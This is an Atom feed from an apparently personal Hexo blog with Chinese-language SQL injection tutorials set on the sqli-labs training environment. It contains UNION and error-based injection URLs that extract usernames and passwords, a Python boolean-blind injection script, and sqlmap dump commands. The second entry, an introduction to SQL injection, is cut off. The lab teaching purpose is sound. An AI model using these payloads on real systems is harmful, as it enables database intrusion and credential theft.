<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>悟往之不谏，知来者可追</title>
  
  <subtitle>1</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-12-23T12:44:41.793Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>李书骏</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL注入技术以及Sqlmap的基本使用</title>
    <link href="http://example.com/2023/12/23/SQL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF%E4%BB%A5%E5%8F%8Asqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2023/12/23/SQL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF%E4%BB%A5%E5%8F%8Asqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2023-12-23T12:35:52.425Z</published>
    <updated>2023-12-23T12:44:41.793Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入技术"><a href="#SQL注入技术" class="headerlink" title="SQL注入技术"></a>SQL注入技术</h1><h2 id="1-基本流程"><a href="#1-基本流程" class="headerlink" title="1.基本流程"></a>1.基本流程</h2><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231223184928821.png" alt="image-20231223184928821"></p><h2 id="2-SQL注入技术"><a href="#2-SQL注入技术" class="headerlink" title="2.SQL注入技术"></a>2.SQL注入技术</h2><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231223185003114.png" alt="image-20231223185003114"></p><h2 id="3-基本MySQL语句"><a href="#3-基本MySQL语句" class="headerlink" title="3.基本MySQL语句"></a>3.基本MySQL语句</h2><h5 id="3-1-判断出闭合类型在SQL注入过程中，首先要确定注入点的闭合方式。闭合类型是指如何正确地结束一个SQL语句，以便将注入的SQL代码融入原始代码中。可以通过在URL参数中尝试不同的闭合符号来实现："><a href="#3-1-判断出闭合类型在SQL注入过程中，首先要确定注入点的闭合方式。闭合类型是指如何正确地结束一个SQL语句，以便将注入的SQL代码融入原始代码中。可以通过在URL参数中尝试不同的闭合符号来实现：" class="headerlink" title="3.1 判断出闭合类型在SQL注入过程中，首先要确定注入点的闭合方式。闭合类型是指如何正确地结束一个SQL语句，以便将注入的SQL代码融入原始代码中。可以通过在URL参数中尝试不同的闭合符号来实现："></a>3.1 判断出闭合类型在SQL注入过程中，首先要确定注入点的闭合方式。闭合类型是指如何正确地结束一个SQL语句，以便将注入的SQL代码融入原始代码中。可以通过在URL参数中尝试不同的闭合符号来实现：</h5><p>例如，考虑URL <code>http://192.168.2.58/Less-1/?id=1</code>。要判断闭合类型，可以尝试以下变化：</p><ul><li>尝试单引号闭合: <code>http://192.168.2.58/Less-1/?id=1&#39;</code></li><li>尝试双引号闭合: <code>http://192.168.2.58/Less-1/?id=1&quot;</code></li><li>尝试单引号和圆括号闭合: <code>http://192.168.2.58/Less-1/?id=1&#39;)</code></li><li>尝试双引号和圆括号闭合: <code>http://192.168.2.58/Less-1/?id=1&quot;))</code></li></ul><h3 id="3-2-判断出字段的数量"><a href="#3-2-判断出字段的数量" class="headerlink" title="3.2 判断出字段的数量"></a>3.2 判断出字段的数量</h3><p>确定了闭合类型后，下一步是确定SQL查询返回的字段数量。这可以通过添加 <code>ORDER BY</code> 语句实现，该语句用于对结果进行排序。通过逐步增加排序的字段数量，直到查询失败，可以确定字段的数量。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httpCopy code</span><br><span class="line">id=1&#x27; ORDER BY 3 --+</span><br></pre></td></tr></table></figure><p>这里，<code>--+</code> 是注释符，用于注释掉原始SQL语句的剩余部分。</p><h3 id="3-3-查询数据库"><a href="#3-3-查询数据库" class="headerlink" title="3.3 查询数据库"></a>3.3 查询数据库</h3><p>查询所有数据库的名称，可以使用以下SQL命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httpCopy code</span><br><span class="line">SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata --+</span><br></pre></td></tr></table></figure><p><code>GROUP_CONCAT</code> 函数用于将多个记录值合并成一个字符串。</p><h3 id="3-4-查询出表"><a href="#3-4-查询出表" class="headerlink" title="3.4 查询出表"></a>3.4 查询出表</h3><p>确定了数据库名称后，下一步是查找特定数据库中的所有表。例如，如果要查询 <code>security</code> 数据库中的所有表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httpCopy code</span><br><span class="line">SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><h3 id="3-5-查询出表的字段"><a href="#3-5-查询出表的字段" class="headerlink" title="3.5 查询出表的字段"></a>3.5 查询出表的字段</h3><p>了解了表名之后，接下来是查找特定表的所有字段。比如，要查询 <code>users</code> 表的所有字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httpCopy code</span><br><span class="line">SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><h3 id="3-6-查询出想要字段的内容"><a href="#3-6-查询出想要字段的内容" class="headerlink" title="3.6 查询出想要字段的内容"></a>3.6 查询出想要字段的内容</h3><p>最后，如果你想获取特定表中某些字段的内容，例如 <code>users</code> 表中 <code>username</code> 和 <code>password</code> 字段的内容，可以使用以下SQL命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httpCopy code</span><br><span class="line">SELECT username, password FROM users WHERE id=&#x27;2&#x27; --+</span><br></pre></td></tr></table></figure><p>这样，就可以获取 <code>id</code> 为2的用户的用户名和密码。</p><h2 id="4-注入方式"><a href="#4-注入方式" class="headerlink" title="4.注入方式"></a>4.注入方式</h2><h3 id="4-1根据注入情况使用注入方式"><a href="#4-1根据注入情况使用注入方式" class="headerlink" title="4.1根据注入情况使用注入方式"></a>4.1根据注入情况使用注入方式</h3><p>使用id&#x3D;1进行尝试尝试 继续使用order by 查询显示位 union select 1，2，3 查询无显示，即无法得到显示位或无法得到列数时放弃使用联合查询<br>尝试使用报错语句?id&#x3D;1’ and updatexml(1,concat(0x7e,database(),0x7e),1) –+等没有报错信息显示时放弃使用报错注入<br>尝试使用布尔盲注和时间盲注（建议使用工具进行注入）<br><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231223185937541.png" alt="image-20231223185937541"></p><h2 id="5-union联合注入（sqlib第一关为例）"><a href="#5-union联合注入（sqlib第一关为例）" class="headerlink" title="5.union联合注入（sqlib第一关为例）"></a>5.union联合注入（sqlib第一关为例）</h2><p>首先打开浏览器 sqlib第一关</p><p>第一关数据库中的表为下图所示，我们可以看到有三个字段，分别是id username password</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231223191922550.png" alt="image-20231223191922550"></p><p>由下图可知，只有两个显示位 ，id显示的位置并没有显示出来（id显示不出来是因为写的代码就没有让id显示出来，无伤大雅），name 和password 显示出来了 我们可以利用这两个显示位做一些事，我们给id,name,password编号为1，2，3 ，现在我们的需求是让2，3 显示到页面上。</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231223192326606.png" alt="image-20231223192326606"></p><h3 id="5-1让sqlib的Less-1页面显示出来2和3"><a href="#5-1让sqlib的Less-1页面显示出来2和3" class="headerlink" title="5.1让sqlib的Less-1页面显示出来2和3"></a><strong>5.1让sqlib的Less-1页面显示出来2和3</strong></h3><p>在HackBar中写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.58/sqli/Less-1/?id=1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231223192523440.png" alt="image-20231223192523440"></p><p>页面没有变化，原因是显示位不够了</p><p>然后在hackbar中运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.58/sqli/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231223192819325.png" alt="image-20231223192819325"></p><h3 id="5-2关于将id值设置为0或者负数的解释"><a href="#5-2关于将id值设置为0或者负数的解释" class="headerlink" title="5.2关于将id值设置为0或者负数的解释"></a><strong>5.2关于将id值设置为0或者负数的解释</strong></h3><p>由于我们的语句是插入到原有语句后面，这样就会出现两个SQL语句同时执行，由于SQL查询会默认返回一行数据，所以我们插入的第二行语句的结果就不会被返回，只会返回原有的SQL语句的查询内容。<br>要让数据库查询我们插入的语句，需要让原有SQL语句产生查询错误，<strong>注意：</strong>查询错误不是语法错误，查询错误只会返回空，不会让语句报错。<br>所以我们可以使id&#x3D;0或id&#x3D;-1，零或负数不会被用作id值，它插入进去一定导致原有SQL语句查询结果为空，我们插入的SQL语句的结果就会被返回。</p><h3 id="5-3group-concat-函数"><a href="#5-3group-concat-函数" class="headerlink" title="5.3group_concat()函数"></a>5.3<strong>group_concat()函数</strong></h3><p>group_concat()函数功能：将 where 条件匹配到的多条记录连接成一个字符串。</p><p>语法：<code>group_concat (str1, str2,...)</code></p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_schema,table_name from information_schema.tables where table_schema=&#x27;security&#x27;;</span><br></pre></td></tr></table></figure><h3 id="5-4使用union和group-concat函数进行sql注入"><a href="#5-4使用union和group-concat函数进行sql注入" class="headerlink" title="5.4使用union和group_concat函数进行sql注入"></a>5.4使用union和group_concat函数进行sql注入</h3><p>把2，3 号显示位替换成我们要查的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://192.168.2.58/sqli/Less-1/?id=-1&#x27; union select 1,table_schema,group_concat(table_name) from information_schema.tables</span><br><span class="line">where table_schema =&#x27;security&#x27; -- -</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231223193303736.png" alt="image-20231223193303736"></p><h5 id="接着查询出表"><a href="#接着查询出表" class="headerlink" title="接着查询出表"></a>接着查询出表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.58/Less-1/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><h5 id="查询出表的字段"><a href="#查询出表的字段" class="headerlink" title="查询出表的字段"></a>查询出表的字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.58/Less-1/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><h5 id="查询出想要字段的内容"><a href="#查询出想要字段的内容" class="headerlink" title="查询出想要字段的内容"></a>查询出想要字段的内容</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.58/Less-1/?id=-1&#x27; union select 1,username,password from users where id=&#x27;2&#x27; --+</span><br></pre></td></tr></table></figure><h2 id="6-报错联合注入（sqlib第五关为例）"><a href="#6-报错联合注入（sqlib第五关为例）" class="headerlink" title="6.报错联合注入（sqlib第五关为例）"></a>6.报错联合注入（sqlib第五关为例）</h2><h3 id="6-1判断是否报错"><a href="#6-1判断是否报错" class="headerlink" title="6.1判断是否报错"></a>6.1判断是否报错</h3><p>参数中添加单&#x2F;双引号，页面报错才可进行下一步。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; -- -</span><br></pre></td></tr></table></figure><h3 id="6-2判断报错条件"><a href="#6-2判断报错条件" class="headerlink" title="6.2判断报错条件"></a>6.2判断报错条件</h3><p>参数中添加报错函数，检查报错信息是否正常回显。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1, 0x7e, 3) -- a #提示：`0x7e` 等价于 `~`3.获取所有数据库</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231223193657427.png" alt="image-20231223193657427"></p><h3 id="6-3获取数据库"><a href="#6-3获取数据库" class="headerlink" title="6.3获取数据库"></a>6.3获取数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.58/sqli/Less-5/?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,</span><br><span class="line">substr( </span><br><span class="line">(select group_concat(schema_name) from information_schema.schemata)</span><br><span class="line">, 32, 128)</span><br><span class="line">),3) -- -</span><br></pre></td></tr></table></figure><h3 id="6-4获取所有表"><a href="#6-4获取所有表" class="headerlink" title="6.4获取所有表"></a>6.4获取所有表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.58/sqli/Less-5/?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr( (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),  1 , 128)),3) -- -</span><br></pre></td></tr></table></figure><h3 id="6-5查询出表的字段"><a href="#6-5查询出表的字段" class="headerlink" title="6.5查询出表的字段"></a>6.5查询出表的字段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.58/sqli/Less-5/?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr( (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),  1 , 128)),3) -- -</span><br></pre></td></tr></table></figure><h3 id="6-5获取表字段中的内容"><a href="#6-5获取表字段中的内容" class="headerlink" title="6.5获取表字段中的内容"></a>6.5获取表字段中的内容</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.58/sqli/Less-5/?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr( (select group_concat(id,username,password) from users),  1 , 32)),3) -- -</span><br></pre></td></tr></table></figure><h2 id="7-布尔盲注（sqlib第五关为例）"><a href="#7-布尔盲注（sqlib第五关为例）" class="headerlink" title="7.布尔盲注（sqlib第五关为例）"></a>7.布尔盲注（sqlib第五关为例）</h2><h3 id="7-1注入原理"><a href="#7-1注入原理" class="headerlink" title="7.1注入原理"></a>7.1注入原理</h3><p>布尔盲注在注入时无回显的情况下适用，原理是应用系统在根据where+and语句进行查询时进行布尔判断即结果真或假，例如select * from admin where id&#x3D;1 and 1&#x3D;1，一般查询中应用系统仅接受 id变量值去拼接sql语句进行查询，使用过union联合查询可知可以闭合sql语句去让应用系统执行我们想要的语句，所以这个情况下，我们构造语句让查询结果为真或为假即可判断起数据库内容（库名、表名、列名、字段值等）。</p><p>函数解释：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">length()//返回字符串长度</span><br><span class="line">substr(a,b,c)//从字符串a中b位截取c个字符</span><br><span class="line">ascii()//将字符逐个转为ascii码ascii码共128个</span><br><span class="line">left(a,b)//从左侧截取前b位</span><br><span class="line">regexp &#x27;^ro&#x27;//正则表达式，此句表示前两位为ro；与 like &#x27;ro%&#x27; 作用一样</span><br><span class="line">ORD()//返回字符串第一个字符的ascii码</span><br><span class="line">MID(a,b,c)    //与substr()用法一样，从字符串a中b位截取c个字符</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231223195842736.png" alt="image-20231223195842736"></p><h3 id="7-2尝试闭合"><a href="#7-2尝试闭合" class="headerlink" title="7.2尝试闭合"></a>7.2<strong>尝试闭合</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; --+</span><br></pre></td></tr></table></figure><h3 id="7-3使用py进行脚本编写进行布尔盲注"><a href="#7-3使用py进行脚本编写进行布尔盲注" class="headerlink" title="7.3使用py进行脚本编写进行布尔盲注"></a>7.3使用py进行脚本编写进行布尔盲注</h3><p><strong>脚本如下</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.15/sqli/Less-5/?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    <span class="comment"># 初始化存储数据库名的字符串</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 循环尝试获取数据库名的每个字符（最多50个字符）</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        <span class="comment"># 设置ASCII值搜索的起始和结束范围</span></span><br><span class="line">        begin = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 使用二分搜索法来缩小ASCII值的范围</span></span><br><span class="line">        tmp = (begin + end) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end:</span><br><span class="line">            <span class="comment"># 构造SQL注入的URL，用于确定数据库名的第i个字符的ASCII值</span></span><br><span class="line">            <span class="comment"># 使用/**/来绕过可能的空格过滤</span></span><br><span class="line">            <span class="comment"># 利用ASCII()和SUBSTR()函数确定字符的ASCII值</span></span><br><span class="line">            paramsGet = url + <span class="string">&quot;/**/and/**/ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i, tmp)</span><br><span class="line">            <span class="comment"># 发送HTTP GET请求</span></span><br><span class="line">            response = session.get(paramsGet)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 判断响应内容中是否包含特定字符串来确定ASCII值范围</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in....&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = tmp</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 更新tmp为新的ASCII值搜索范围的中间值</span></span><br><span class="line">            tmp = (begin + end) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果tmp等于32（ASCII码表中的空格），则假定已超出数据库名称长度</span></span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将ASCII值转换为字符并添加到数据库名称字符串</span></span><br><span class="line">        name += <span class="built_in">chr</span>(tmp)</span><br><span class="line">        <span class="comment"># 打印目前为止获取的数据库名称</span></span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数开始SQL注入过程</span></span><br><span class="line">db()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>核心函数的解析：</strong></p><ul><li><code>ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;</code> 这部分是关键，它使用 <code>ASCII()</code> 函数来获取数据库名称中特定位置字符的ASCII值，并使用 <code>SUBSTR()</code> 函数来截取该字符。然后，它将这个ASCII值与当前的<code>tmp</code>值进行比较。</li><li>根据响应内容，脚本判断字符的ASCII值是大于还是小于<code>tmp</code>，然后相应地调整<code>begin</code>和<code>end</code>的值。这种方法被重复执行，直到找到正确的ASCII值。</li><li>一旦ASCII值被确定，它就被转换为相应的字符并附加到<code>name</code>字符串上。这个过程对数据库名称的每个字符重复，直到达到50个字符或者没有更多字符可获取。</li></ul><p>运行脚本后</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231223201252754.png" alt="image-20231223201252754"></p><h2 id="8-sqlmap工具的使用"><a href="#8-sqlmap工具的使用" class="headerlink" title="8.sqlmap工具的使用"></a>8.sqlmap工具的使用</h2><p>打开kali系统，在kali系统中打开终端。</p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -h</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231223202154057.png" alt="image-20231223202154057"></p><p><strong>输入指令后内容翻译如下：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">注入：</span><br><span class="line">这些选项可用于指定要测试的参数，提供自定义注入载荷和可选的篡改脚本</span><br><span class="line"></span><br><span class="line">-p TESTPARAMETER 可测试的参数</span><br><span class="line">--dbms=DBMS 强制后端DBMS使用提供的值</span><br><span class="line"></span><br><span class="line">检测：</span><br><span class="line">这些选项可用于自定义检测阶段</span><br><span class="line"></span><br><span class="line">--level=LEVEL 执行测试的级别（1-5，默认为1）</span><br><span class="line">--risk=RISK 执行测试的风险（1-3，默认为1）</span><br><span class="line"></span><br><span class="line">技巧：</span><br><span class="line">这些选项可用于微调特定SQL注入技巧的测试</span><br><span class="line"></span><br><span class="line">--technique=TECH.. 要使用的SQL注入技巧（默认为&quot;BEUSTQ&quot;）</span><br><span class="line"></span><br><span class="line">枚举：</span><br><span class="line">这些选项可用于枚举后端数据库管理系统的信息、结构和表中包含的数据</span><br><span class="line"></span><br><span class="line">-a, --all 检索所有内容</span><br><span class="line">-b, --banner 检索DBMS标语</span><br><span class="line">--current-user 检索DBMS当前用户</span><br><span class="line">--current-db 检索DBMS当前数据库</span><br><span class="line">--passwords 枚举DBMS用户密码哈希</span><br><span class="line">--dbs 枚举DBMS数据库</span><br><span class="line">--tables 枚举DBMS数据库表</span><br><span class="line">--columns 枚举DBMS数据库表列</span><br><span class="line">--schema 枚举DBMS模式</span><br><span class="line">--dump 转储DBMS数据库表条目</span><br><span class="line">--dump-all 转储所有DBMS数据库表条目</span><br><span class="line">-D DB 要枚举的DBMS数据库</span><br><span class="line">-T TBL 要枚举的DBMS数据库表</span><br><span class="line">-C COL 要枚举的DBMS数据库表列</span><br><span class="line"></span><br><span class="line">操作系统访问：</span><br><span class="line">这些选项可用于访问后端数据库管理系统底层操作系统</span><br><span class="line"></span><br><span class="line">--os-shell 提示进行交互式操作系统shell</span><br><span class="line">--os-pwn 提示进行OOB shell、Meterpreter或VNC</span><br><span class="line"></span><br><span class="line">一般：</span><br><span class="line">这些选项可用于设置一些一般工作参数</span><br><span class="line"></span><br><span class="line">--batch 永不要求用户输入，使用默认行为</span><br><span class="line">--flush-session 刷新当前目标的会话文件</span><br><span class="line"></span><br><span class="line">杂项：</span><br><span class="line">这些选项不属于任何其他类别</span><br><span class="line"></span><br><span class="line">--wizard 面向初学者用户的简单向导界面</span><br><span class="line"></span><br><span class="line">[!] 要查看所有选项的完整列表，请使用&#x27;-hh&#x27;参数运行。</span><br></pre></td></tr></table></figure><p>根据以上翻译，若我们需要得到数据库我们可以直接在终端输入框中输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.15/sqli/Less-1/?id=1&quot; --dbs --batch</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231223203139401.png" alt="image-20231223203139401"></p><p>输入以下指令我们可以得到<code>users</code>表中<code>id</code>以及<code>username</code>字段的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u &quot;http://192.168.2.58/sqli/Less-9/?id=1&quot;  --batch -D security -T users -C &quot;id,username&quot; --dump</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231223203519460.png" alt="image-20231223203519460"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQL注入技术&quot;&gt;&lt;a href=&quot;#SQL注入技术&quot; class=&quot;headerlink&quot; title=&quot;SQL注入技术&quot;&gt;&lt;/a&gt;SQL注入技术&lt;/h1&gt;&lt;h2 id=&quot;1-基本流程&quot;&gt;&lt;a href=&quot;#1-基本流程&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
    <category term="1" scheme="http://example.com/tags/1/"/>
    
  </entry>
  
  <entry>
    <title>Sql的基本认识</title>
    <link href="http://example.com/2023/12/23/Sql%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/"/>
    <id>http://example.com/2023/12/23/Sql%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/</id>
    <published>2023-12-23T10:44:42.489Z</published>
    <updated>2023-12-23T12:44:47.433Z</updated>
    
    <content type="html"><![CDATA[<ol><li><h2 id="Sql注入简介"><a href="#Sql注入简介" class="headerlink" title="Sql注入简介"></a>Sql注入简介</h2></li></ol><p>Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。</p><h3 id="1-1Web-程序三层架构"><a href="#1-1Web-程序三层架构" class="headerlink" title="1.1Web 程序三层架构"></a>1.1Web 程序三层架构</h3><p>三层架构(3-tier architecture) 通常意义上就是将整个业务应用划分为：</p><p>界面层（User Interface layer）</p><p>业务逻辑层（Business Logic Layer）</p><p>数据访问层（Data access layer）。</p><p>区分层次的目的即为了“高内聚低耦合”的思想。在软件体系架构设计中，分层式结构是最常见，也是最重要的一种结构被应用于众多类型的软件开发。<br>由数据库驱动的Web应用程序依从三层架构的思想也分为了三层：</p><p>表示层。</p><p>业务逻辑层（又称领域层）</p><p>数据访问层（又称存储层）<br>拓扑结构如下图所示</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/20190517171003706.png" alt="img"></p><h3 id="1-2-用户访问实验楼主页进行了如下过程："><a href="#1-2-用户访问实验楼主页进行了如下过程：" class="headerlink" title="1.2 用户访问实验楼主页进行了如下过程："></a>1.2 用户访问实验楼主页进行了如下过程：</h3><p>在 Web 浏览器中输入 <a href="http://www.shiyanlou.com/">www.shiyanlou.com</a> 连接到实验楼服务器。</p><p>业务逻辑层的 Web 服务器从本地存储中加载 index.php 